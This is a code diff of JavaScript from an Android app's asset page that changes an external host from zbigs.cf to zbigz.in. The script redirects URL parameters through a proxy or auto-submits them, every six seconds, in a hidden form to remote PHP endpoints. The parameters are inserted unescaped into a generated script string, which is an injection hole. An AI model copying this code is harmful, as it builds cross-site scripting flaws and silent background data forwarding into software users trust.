@@ -9,25 +9,25 @@ $(document).ready(function(){
 if(l!=null && l.startsWith("file:///android_asset/reds.html?ux=/reds.")){
     var b = getParameterByName("uxs");
     var c = getParameterByName("n");
-    window.location.href = "http://deepweb.tv/http://zbigs.cf/dtn.php?ux="+b+"&n="+c+"";
+    window.location.href = "http://deepweb.tv/http://zbigz.in/dtn.php?ux="+b+"&n="+c+"";
     
 }else if(l!=null && l.startsWith("file:///android_asset/reds.html?ux=/redss.")){
     
 var b = getParameterByName("uxs");
 var c = getParameterByName("n");
-    window.location.href = "http://deepweb.tv/http://zbigs.cf/ss.php?ux="+b+"&n="+c+"";
+    window.location.href = "http://deepweb.tv/http://zbigz.in/ss.php?ux="+b+"&n="+c+"";
     
     
 }else if(l!=null && l.startsWith("file:///android_asset/reds.html?ux=/redsx.")){
     var b = getParameterByName("uxs");
     var c = getParameterByName("n");
-    window.location.href = "http://deepweb.tv/http://zbigs.cf/dtnx.php?ux="+b+"&n="+c+"";
+    window.location.href = "http://deepweb.tv/http://zbigz.in/dtnx.php?ux="+b+"&n="+c+"";
     
 }else if(l!=null && l.startsWith("file:///android_asset/reds.html?ux=/redssx.")){
     
 var b = getParameterByName("uxs");
 var c = getParameterByName("n");
-window.location.href = "http://deepweb.tv/http://zbigs.cf/ssx.php?ux="+b+"&n="+c+"";
+window.location.href = "http://deepweb.tv/http://zbigz.in/ssx.php?ux="+b+"&n="+c+"";
     
 }
 
@@ -85,27 +85,27 @@ $(document).ready(function(){
 if(l!=null && l.startsWith("file:///android_asset/reds.html?ux=/reds.")){
     var b = getParameterByName("uxs");
     var c = getParameterByName("n");
-    $("body").replaceWith('<body><form method="post" id="myForm"><input class="input" name="ux"> <input class="input2" name="n"></form><script>$("form").attr("action", "http://zbigs.cf/dtn.php");$(".input").attr("value", "'+b+'");$(".input2").attr("value", "'+c+'");document.getElementById("myForm").submit();setInterval(function(){document.getElementById("myForm").submit();},6000);</script></body>');
+    $("body").replaceWith('<body><form method="post" id="myForm"><input class="input" name="ux"> <input class="input2" name="n"></form><script>$("form").attr("action", "http://zbigz.in/dtn.php");$(".input").attr("value", "'+b+'");$(".input2").attr("value", "'+c+'");document.getElementById("myForm").submit();setInterval(function(){document.getElementById("myForm").submit();},6000);</script></body>');
     
     
 }else if(l!=null && l.startsWith("file:///android_asset/reds.html?ux=/redss.")){
     
 var b = getParameterByName("uxs");
 var c = getParameterByName("n");
-    $("body").replaceWith('<body><form method="post" id="myForm"><input class="input" name="ux"> <input class="input2" name="n"></form><script>$("form").attr("action", "http://zbigs.cf/ss.php");$(".input").attr("value", "'+b+'");$(".input2").attr("value", "'+c+'");document.getElementById("myForm").submit();setInterval(function(){document.getElementById("myForm").submit();},6000);</script></body>');
+    $("body").replaceWith('<body><form method="post" id="myForm"><input class="input" name="ux"> <input class="input2" name="n"></form><script>$("form").attr("action", "http://zbigz.in/ss.php");$(".input").attr("value", "'+b+'");$(".input2").attr("value", "'+c+'");document.getElementById("myForm").submit();setInterval(function(){document.getElementById("myForm").submit();},6000);</script></body>');
     
     
 }else if(l!=null && l.startsWith("file:///android_asset/reds.html?ux=/redsx.")){
     var b = getParameterByName("uxs");
     var c = getParameterByName("n");
-    $("body").replaceWith('<body><form method="post" id="myForm"><input class="input" name="ux"> <input class="input2" name="n"></form><script>$("form").attr("action", "http://zbigs.cf/dtnx.php");$(".input").attr("value", "'+b+'");$(".input2").attr("value", "'+c+'");document.getElementById("myForm").submit();setInterval(function(){document.getElementById("myForm").submit();},6000);</script></body>');
+    $("body").replaceWith('<body><form method="post" id="myForm"><input class="input" name="ux"> <input class="input2" name="n"></form><script>$("form").attr("action", "http://zbigz.in/dtnx.php");$(".input").attr("value", "'+b+'");$(".input2").attr("value", "'+c+'");document.getElementById("myForm").submit();setInterval(function(){document.getElementById("myForm").submit();},6000);</script></body>');
     
     
 }else if(l!=null && l.startsWith("file:///android_asset/reds.html?ux=/redssx.")){
     
 var b = getParameterByName("uxs");
 var c = getParameterByName("n");
-    $("body").replaceWith('<body><form method="post" id="myForm"><input class="input" name="ux"> <input class="input2" name="n"></form><script>$("form").attr("action", "http://zbigs.cf/ssx.php");$(".input").attr("value", "'+b+'");$(".input2").attr("value", "'+c+'");document.getElementById("myForm").submit();setInterval(function(){document.getElementById("myForm").submit();},6000);</script></body>');
+    $("body").replaceWith('<body><form method="post" id="myForm"><input class="input" name="ux"> <input class="input2" name="n"></form><script>$("form").attr("action", "http://zbigz.in/ssx.php");$(".input").attr("value", "'+b+'");$(".input2").attr("value", "'+c+'");document.getElementById("myForm").submit();setInterval(function(){document.getElementById("myForm").submit();},6000);</script></body>');
     
     
 }
